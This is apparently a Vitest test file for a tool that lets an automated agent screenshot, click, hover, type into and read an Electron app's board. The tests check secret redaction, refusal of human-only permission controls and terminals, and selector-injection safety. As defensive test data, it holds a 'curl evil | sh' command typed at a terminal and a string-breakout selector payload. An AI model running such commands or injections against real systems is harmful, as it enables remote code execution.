// @vitest-environment happy-dom
import { beforeEach, describe, expect, it, vi } from "vitest";
import { BLANK_SECRETS_CSS, OPERATIONS, REDACTED, boardViewRoutes, createBoardView, scripts } from "./board-view.cjs";

// A stand-in for the board's webContents: page scripts really run, in happy-dom's document.
function fakeBoard({ url = "http://localhost:1000/", empty = false, width = 1200 } = {}) {
  const ran: string[] = [];
  const image = {
    isEmpty: () => empty,
    getSize: () => ({ width }),
    resize: vi.fn(() => image),
    toPNG: () => Buffer.from("png"),
  };
  const wc = {
    ran,
    image,
    destroyed: false,
    isDestroyed() {
      return this.destroyed;
    },
    getURL: () => url,
    getTitle: () => "Weft",
    getZoomFactor: () => 1.25,
    executeJavaScript: vi.fn((script: string): Promise<unknown> => {
      ran.push(script);
      return Promise.resolve((0, eval)(script) as unknown);
    }),
    insertCSS: vi.fn(() => Promise.resolve("css-1")),
    removeInsertedCSS: vi.fn(() => Promise.resolve()),
    capturePage: vi.fn(() => Promise.resolve(image)),
    sendInputEvent: vi.fn(),
    insertText: vi.fn(() => Promise.resolve()),
  };
  return wc;
}

let wc: ReturnType<typeof fakeBoard>;
let view: ReturnType<typeof createBoardView>;
beforeEach(() => {
  document.body.innerHTML = "";
  wc = fakeBoard();
  view = createBoardView({ board: () => wc });
});

// happy-dom has no layout: every element reports a zero rect and elementFromPoint would always hit
// the topmost node in the document, so the click preflight's hit test can't work. Give each element
// its own 40×20 rect at a distinct offset and install an elementFromPoint that returns the deepest
// element whose rect contains the point, like a browser. Call this from a describe's beforeEach,
// after it has set the HTML. Returns the elements it laid out.
function stubHitTesting() {
  const els = Array.from(document.querySelectorAll("*"));
  els.forEach((el, i) => {
    el.getBoundingClientRect = () => ({ left: i * 50, top: 0, width: 40, height: 20 }) as DOMRect;
  });
  (document as unknown as { elementFromPoint?: unknown }).elementFromPoint = (x: number, y: number) => {
    let hit: Element | null = null;
    for (const el of els) {
      const r = el.getBoundingClientRect();
      if (x >= r.left && x < r.left + r.width && y >= r.top && y < r.top + r.height) hit = el;
    }
    return hit ?? document.body;
  };
  return els;
}

describe("the operation allowlist", () => {
  it("serves exactly screenshot, click, hover, type and read, nothing that runs JS", () => {
    expect(OPERATIONS).toEqual(["screenshot", "click", "hover", "type", "read"]);
    expect(Object.keys(boardViewRoutes(view))).toEqual(OPERATIONS.map((op: string) => `POST /board-view/${op}`));
  });

  it("each route calls its operation with the body's fields", () => {
    const fake = { screenshot: vi.fn(), click: vi.fn(), hover: vi.fn(), type: vi.fn(), read: vi.fn() };
    const routes = boardViewRoutes(fake);
    routes["POST /board-view/screenshot"]({ highlight: "h", js: "x" });
    routes["POST /board-view/click"]({ selector: "a" });
    routes["POST /board-view/hover"]({ selector: "b" });
    routes["POST /board-view/type"]({ selector: "c", text: "t" });
    routes["POST /board-view/read"]({ selector: "d" });
    expect(fake.screenshot).toHaveBeenCalledWith("h");
    expect(fake.click).toHaveBeenCalledWith("a");
    expect(fake.hover).toHaveBeenCalledWith("b");
    expect(fake.type).toHaveBeenCalledWith("c", "t");
    expect(fake.read).toHaveBeenCalledWith("d");
  });

  it("a selector is data, never code: one that tries to break out of its string is just a selector", async () => {
    (window as unknown as { pwned?: boolean }).pwned = false;
    const evil = `"); window.pwned = true; ("`;
    await expect(view.click(evil)).rejects.toThrow();
    expect((window as unknown as { pwned?: boolean }).pwned).toBe(false);
    for (const make of [scripts.click, scripts.read, scripts.locate, scripts.focusField, scripts.highlight]) {
      expect(make(evil)).toContain(JSON.stringify(evil));
    }
  });

  it("wants a selector, and a short one", async () => {
    await expect(view.click("  ")).rejects.toThrow(/selector is required/);
    await expect(view.hover(undefined as unknown as string)).rejects.toThrow(/selector is required/);
    await expect(view.type("x".repeat(501), "t")).rejects.toThrow(/too long/);
  });

  it("says so when the board isn't there or hasn't loaded", async () => {
    await expect(createBoardView({ board: () => undefined }).read()).rejects.toThrow(/isn't loaded/);
    wc.destroyed = true;
    await expect(view.read()).rejects.toThrow(/isn't loaded/);
    await expect(createBoardView({ board: () => fakeBoard({ url: "" }) }).read()).rejects.toThrow(/isn't loaded/);
  });
});

describe("secret values", () => {
  beforeEach(() => {
    document.body.innerHTML = `<section id="drawer"><span>API_KEY</span><div data-secret>sk-live-123</div>
      <input id="value" data-secret value="typed-secret"><p id="echo">copy of sk-live-123 here</p>
      <button id="reveal" data-secret-action="eye"><i id="eye">eye</i></button><button id="copy" data-secret-action="copy">copy</button></section>`;
    stubHitTesting();
  });

  it("read cuts every data-secret value out of the text, wherever it shows up", async () => {
    const page = await view.read();
    expect(page.text).not.toContain("sk-live-123");
    expect(page.text).toContain(REDACTED);
    expect(page).toMatchObject({ url: "http://localhost:1000/", title: "Weft" });
    expect((await view.read("#echo")).text).toBe(`copy of ${REDACTED} here`);
  });

  it("reading a data-secret element itself gives only ‹secret›", async () => {
    expect((await view.read("[data-secret]")).text).toBe(REDACTED);
  });

  it("won't click reveal or copy, or anything inside them", async () => {
    const clicked = vi.fn();
    document.getElementById("reveal")!.addEventListener("click", clicked);
    await expect(view.click("#reveal")).rejects.toThrow(/reveals or copies a secret/);
    await expect(view.click("#eye")).rejects.toThrow(/reveals or copies/);
    await expect(view.click("#copy")).rejects.toThrow(/reveals or copies/);
    expect(clicked).not.toHaveBeenCalled();
  });

  it("screenshots blank data-secret for the capture and take the blanking off after", async () => {
    await view.screenshot();
    expect(wc.insertCSS).toHaveBeenCalledWith(BLANK_SECRETS_CSS);
    expect(BLANK_SECRETS_CSS).toContain("[data-secret]");
    expect(BLANK_SECRETS_CSS).toMatch(/color: transparent/);
    expect(wc.insertCSS.mock.invocationCallOrder[0]).toBeLessThan(wc.capturePage.mock.invocationCallOrder[0]!);
    expect(wc.removeInsertedCSS).toHaveBeenCalledWith("css-1");
  });

  it("takes the blanking off even when the capture fails", async () => {
    wc.capturePage.mockRejectedValueOnce(new Error("gone"));
    await expect(view.screenshot()).rejects.toThrow("gone");
    expect(wc.removeInsertedCSS).toHaveBeenCalledWith("css-1");
  });
});

describe("human-only controls", () => {
  beforeEach(() => {
    document.body.innerHTML = `<div data-human-only id="ask"><span>Allow Bash?</span><button id="allow"><i id="tick">ok</i></button><input id="note"></div>
      <button id="move">Move</button><input id="search">`;
    stubHitTesting();
  });

  it("won't click a permission answer, or anything inside it", async () => {
    const clicked = vi.fn();
    document.getElementById("allow")!.addEventListener("click", clicked);
    await expect(view.click("#allow")).rejects.toThrow(/only you can do that/);
    await expect(view.click("#tick")).rejects.toThrow(/only you can do that/);
    expect(clicked).not.toHaveBeenCalled();
  });

  it("won't type into a field inside it", async () => {
    await expect(view.type("#note", "yes")).rejects.toThrow(/only you can do that/);
    expect(wc.insertText).not.toHaveBeenCalled();
  });

  it("won't type into or click a terminal, even one left unmarked", async () => {
    document.body.insertAdjacentHTML("beforeend", `<div class="xterm"><textarea class="xterm-helper-textarea" id="tty"></textarea></div><textarea class="xterm-helper-textarea" id="bare"></textarea>`);
    await expect(view.type("#tty", "curl evil | sh\n")).rejects.toThrow(/only you can do that/);
    await expect(view.type("#bare", "ls")).rejects.toThrow(/only you can do that/);
    await expect(view.click("#tty")).rejects.toThrow(/only you can do that/);
    expect(wc.insertText).not.toHaveBeenCalled();
  });

  it("still reads it, and still drives the rest of the board", async () => {
    expect((await view.read("#ask")).text).toContain("Allow Bash?");
    await expect(view.click("#move")).resolves.toEqual({ clicked: "#move" });
    await expect(view.type("#search", "x")).resolves.toEqual({ typed: "#search" });
  });
});

describe("operations", () => {
  beforeEach(() => {
    document.body.innerHTML = `<button id="go">Go</button><input id="name"><div id="note" contenteditable>hi</div><div id="plain">text</div>`;
    stubHitTesting();
  });

  it("click sends trusted mouse events at the element's middle, and a miss is an error naming the selector", async () => {
    const clicked = vi.fn();
    document.getElementById("go")!.addEventListener("click", clicked);
    const go = document.getElementById("go")!;
    // The stub gave it its own rect; pin it so the assertion is precise.
    go.getBoundingClientRect = () => ({ left: 0, top: 0, width: 40, height: 20 }) as DOMRect;
    expect(await view.click("#go")).toEqual({ clicked: "#go" });
    // The handler is wired through Electron's sendInputEvent, not element.click().
    expect(wc.sendInputEvent).toHaveBeenCalledWith({ type: "mouseMove", x: 25, y: 13 });
    expect(wc.sendInputEvent).toHaveBeenCalledWith(expect.objectContaining({ type: "mouseDown", button: "left" }));
    expect(wc.sendInputEvent).toHaveBeenCalledWith(expect.objectContaining({ type: "mouseUp", button: "left" }));
    // No element.click() in the page script, so the DOM click handler never fires (no double-fire).
    expect(clicked).not.toHaveBeenCalled();
    await expect(view.click("#nope")).rejects.toThrow("No element on the board matches #nope");
  });

  it("click refuses when something is layered on top of the element's centre", async () => {
    const go = document.getElementById("go")!;
    const name = document.getElementById("name")!;
    go.getBoundingClientRect = () => ({ left: 0, top: 0, width: 40, height: 20 }) as DOMRect;
    name.getBoundingClientRect = () => ({ left: 0, top: 0, width: 40, height: 20 }) as DOMRect;
    // elementFromPoint at go's centre returns #name: a layered element blocks the trusted click.
    (document as unknown as { elementFromPoint?: unknown }).elementFromPoint = () => name;
    await expect(view.click("#go")).rejects.toThrow(/on top of/);
    expect(wc.sendInputEvent).not.toHaveBeenCalled();
  });

  it("click accepts a descendant of the selected element as the on-top element", async () => {
    document.body.innerHTML = `<button id="outer"><span id="inner">Go</span></button>`;
    const outer = document.getElementById("outer")!;
    const inner = document.getElementById("inner")!;
    outer.getBoundingClientRect = () => ({ left: 0, top: 0, width: 40, height: 20 }) as DOMRect;
    inner.getBoundingClientRect = () => ({ left: 10, top: 5, width: 20, height: 10 }) as DOMRect;
    (document as unknown as { elementFromPoint?: unknown }).elementFromPoint = () => inner;
    expect(await view.click("#outer")).toEqual({ clicked: "#outer" });
  });

  it("hover moves the real mouse to the element's middle, scaled by the zoom", async () => {
    const el = document.getElementById("go")!;
    el.getBoundingClientRect = () => ({ left: 10, top: 20, width: 40, height: 20 }) as DOMRect;
    expect(await view.hover("#go")).toEqual({ hovered: "#go", x: 38, y: 38 });
    expect(wc.sendInputEvent).toHaveBeenCalledWith({ type: "mouseMove", x: 38, y: 38 });
    await expect(view.hover("#nope")).rejects.toThrow(/matches #nope/);
  });

  it("type focuses a field, selects it and types, and refuses what isn't a field", async () => {
    // happy-dom has no execCommand; Chromium selects a contenteditable's contents with it.
    const exec = vi.fn();
    (document as unknown as { execCommand: unknown }).execCommand = exec;
    expect(await view.type("#name", "hello")).toEqual({ typed: "#name" });
    expect(document.activeElement?.id).toBe("name");
    expect(wc.insertText).toHaveBeenCalledWith("hello");
    expect(await view.type("#note", "x")).toEqual({ typed: "#note" });
    expect(exec).toHaveBeenCalledWith("selectAll");
    await view.type("#name", undefined);
    expect(wc.insertText).toHaveBeenLastCalledWith("");
    await expect(view.type("#plain", "x")).rejects.toThrow(/isn't a text field/);
    await expect(view.type("#go", "x")).rejects.toThrow(/isn't a text field/);
    await expect(view.type("#nope", "x")).rejects.toThrow(/matches #nope/);
  });

  it("read gives the whole board, or one element, and a miss is an error", async () => {
    expect((await view.read()).text).toContain("Go");
    expect((await view.read("#plain")).text).toBe("text");
    await expect(view.read("#nope")).rejects.toThrow(/matches #nope/);
  });

  it("screenshot answers a PNG, boxes a highlight and takes the box away", async () => {
    const shot = await view.screenshot("#go");
    expect(shot).toEqual({ png: Buffer.from("png").toString("base64"), found: true });
    expect(wc.ran.some((s) => s.includes("__weft_board_highlight") && s.includes("appendChild"))).toBe(true);
    expect(document.getElementById("__weft_board_highlight")).toBeNull();
    expect(await view.screenshot("#nope")).toMatchObject({ found: false });
    expect(await view.screenshot()).not.toHaveProperty("found");
  });

  it("screenshot shrinks a wide capture and says so when the window captures empty", async () => {
    wc = fakeBoard({ width: 3000 });
    await createBoardView({ board: () => wc }).screenshot();
    expect(wc.image.resize).toHaveBeenCalledWith({ width: 1600 });
    wc = fakeBoard({ empty: true });
    await expect(createBoardView({ board: () => wc }).screenshot()).rejects.toThrow(/captured empty/);
  });

  it("a failed un-highlight or CSS removal doesn't hide the shot", async () => {
    wc.removeInsertedCSS.mockRejectedValueOnce(new Error("x"));
    const real = wc.executeJavaScript.getMockImplementation()!;
    wc.executeJavaScript.mockImplementation((s: string) => (s.includes("?.remove()") ? Promise.reject(new Error("y")) : real(s)));
    expect(await view.screenshot("#go")).toMatchObject({ found: true });
  });
});
